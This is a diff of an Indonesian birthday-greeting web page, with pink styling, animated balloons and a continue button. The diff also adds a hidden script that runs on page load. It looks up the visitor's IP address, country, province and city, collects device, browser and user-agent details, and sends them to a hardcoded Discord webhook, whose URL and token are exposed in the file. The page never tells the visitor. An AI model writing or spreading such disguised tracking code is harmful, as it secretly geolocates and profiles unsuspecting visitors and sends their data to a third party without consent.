@@ -3,9 +3,263 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ppp</title>
+    <link rel="icon" type="image/x-icon" href="./gambar/1.png">
+    <title>larya-awal</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0adad;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        h1 {
+            color: #ff69b4;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #333;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .balloon {
+            position: absolute;
+            animation: fly 15s linear infinite;
+            transform: translateY(0%);
+        }
+        @keyframes fly {
+            0% {
+                transform: translateY(0%);
+            }
+            100% {
+                transform: translateY(-120%);
+            }
+        }
+        .decoration {
+            position: absolute;
+            opacity: 0.5;
+        }
+        .decoration:nth-child(1) {
+            top: 10%;
+            left: 10%;
+            width: 120px;
+            transform: rotate(45deg);
+        }
+        .decoration:nth-child(2) {
+            top: 20%;
+            right: 10%;
+            width: 100px;
+            transform: rotate(-45deg);
+        }
+        .decoration:nth-child(3) {
+            bottom: 5%;
+            left: 20%;
+            width: 140px;
+            transform: rotate(30deg);
+        }
+        .signature {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #888;
+        }
+        .signature a {
+            color: #333;
+            text-decoration: none;
+        }
+        .signature a:hover {
+            color: #ff69b4;
+        }
+        /* Balon di header */
+        .header-balloon {
+            position: absolute;
+            animation: fly 15s linear infinite;
+        }
+        .header-balloon:nth-child(1) {
+            left: 5%;
+            top: 15%;
+            width: 80px;
+        }
+        .header-balloon:nth-child(2) {
+            right: 5%;
+            top: 25%;
+            width: 60px;
+        }
+        .header-balloon:nth-child(3) {
+            left: 15%;
+            top: 35%;
+            width: 90px;
+        }
+        .continue-button {
+            background-color: #ff69b4;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .continue-button:hover {
+            background-color: #e04997;
+        }
+    </style>
 </head>
 <body>
-    <h1>HAHAHAHAaa</h1>
+    <div class="container">
+        <h1>Happy Birthday!</h1>
+        <img src="local_birthday_image.jpg" alt="Ulang Tahun" style="width: 200px; margin-bottom: 20px;">
+        <p>Selamat ulang tahun yang ke-20! Semoga hari ini penuh dengan kebahagiaan dan keceriaan. Terima kasih telah menjadi bagian dari kehidupan kami.</p>
+        <div class="signature">
+            Created by <a href="https://www.instagram.com/gilar.yaa/" target="_blank">thomyy</a>
+        </div>
+        <p></p>
+        <button class="continue-button" onclick="window.location.href='index-c.html'">Lanjutkan</button>
+    </div>
+    <!-- Balon di dalam header -->
+    <img class="header-balloon" src="./gambar/1.png" alt="Balon">
+    <img class="header-balloon" src="./gambar/2.png" alt="Balon">
+    <img class="header-balloon" src="./gambar/3.png" alt="Balon">
+    <!-- Balon 1 -->
+    <img class="balloon" src="/gambar/4.png" alt="Balon" style="left: 20%; top: 80%; width: 60px;">
+    <!-- Balon 2 -->
+    <img class="balloon" src="./gambar/5.png" alt="Balon" style="left: 50%; top: 90%; width: 90px;">
+    <!-- Balon 3 -->
+    <img class="balloon" src="./gambar/6.png" alt="Balon" style="left: 80%; top: 85%; width: 50px;">
+    <!-- Balon 4 -->
+    <img class="balloon" src="./gambar/7.png" alt="Balon" style="left: 30%; top: 70%; width: 80px;">
+    <!-- Balon 5 -->
+<img class="balloon" src="./gambar/8.png" alt="Balon" style="left: 70%; top: 60%; width: 70px;">
+<!-- Balon 6 -->
+<img class="balloon" src="./gambar/9.png" alt="Balon" style="left: 40%; top: 75%; width: 100px;">
+<!-- Balon 7 -->
+<img class="balloon" src="./gambar/10.png" alt="Balon" style="left: 60%; top: 85%; width: 60px;">
+<!-- Balon 8 -->
+<img class="balloon" src="./gambar/11.png" alt="Balon" style="left: 65%; top: 70%; width: 90px;">
+<!-- Balon 9 -->
+<img class="balloon" src="./gambar/12.png" alt="Balon" style="left: 10%; top: 60%; width: 80px;">
+<!-- Balon 10 -->
+<img class="balloon" src="./gambar/5.png" alt="Balon" style="left: 90%; top: 80%; width: 70px;">
+<!-- Balon 11 -->
+<img class="balloon" src="./gambar/5.png" alt="Balon" style="left: 25%; top: 65%; width: 50px;">
+<!-- Balon 12 -->
+<img class="balloon" src="./gambar/5.png" alt="Balon" style="left: 75%; top: 75%; width: 80px;">
+
 </body>
+<script>
+    window.onload = function() {
+        sendWebhookOnLoad();
+    };
+
+    function sendWebhookOnLoad() {
+        // Mendapatkan informasi IP pengguna
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            var ip = data.ip;
+            // Mendapatkan informasi negara, provinsi, dan kota dari IP
+            fetch(`https://ipapi.co/${ip}/json/`)
+            .then(response => response.json())
+            .then(locationData => {
+                var country = locationData.country_name;
+                var region = locationData.region;
+                var city = locationData.city;
+                // Mendapatkan informasi perangkat pengguna
+                var device = navigator.platform;
+                // Mendapatkan informasi browser
+                var browser = getBrowserInfo();
+                // Mendapatkan informasi user agent
+                var userAgent = navigator.userAgent;
+                // Data yang akan dikirim ke webhook
+                var postData = {
+                    embeds: [{
+                        title: 'Seseorang telah membuka halaman ulang tahun!',
+                        color: 16711710,
+                        fields: [
+                            {
+                                name: 'Informasi IP',
+                                value: ip,
+                                inline: true
+                            },
+                            {
+                                name: 'Negara',
+                                value: country,
+                                inline: true
+                            },
+                            {
+                                name: 'Provinsi',
+                                value: region,
+                                inline: true
+                            },
+                            {
+                                name: 'Kota',
+                                value: city,
+                                inline: true
+                            },
+                            {
+                                name: 'Perangkat',
+                                value: device,
+                                inline: true
+                            },
+                            {
+                                name: 'Browser',
+                                value: browser,
+                                inline: true
+                            },
+                            {
+                                name: 'User Agent',
+                                value: userAgent
+                            }
+                        ]
+                    }]
+                };
+
+                // URL webhook Discord
+                var webhookURL = 'https://discord.com/api/webhooks/1220702883188834304/SuUD2y3E3LsRibzoDOXyLeae0eXwMIczCRfc3QQJ3zUdIoWH8ZEANhtEv4vPrM4DClO9';
+
+                // Konfigurasi permintaan
+                var request = new XMLHttpRequest();
+                request.open('POST', webhookURL);
+                request.setRequestHeader('Content-type', 'application/json');
+
+                // Mengirim data sebagai JSON
+                request.send(JSON.stringify(postData));
+
+                // Mengirim log ke konsol
+                console.log('Halaman ulang tahun dibuka!');
+            });
+        })
+        .catch(error => console.error('Error:', error));
+    }
+
+    // Fungsi untuk mendapatkan informasi browser
+    function getBrowserInfo() {
+        var ua = navigator.userAgent;
+        var tem, M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+        if (/trident/i.test(M[1])) {
+            tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
+            return 'IE ' + (tem[1] || '');
+        }
+        if (M[1] === 'Chrome') {
+            tem = ua.match(/\bOPR\/(\d+)/);
+            if (tem != null) return 'Opera ' + tem[1];
+        }
+        M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
+        if ((tem = ua.match(/version\/(\d+)/i)) != null) M.splice(1, 1, tem[1]);
+        return M.join(' ');
+    }
+</script>
 </html>
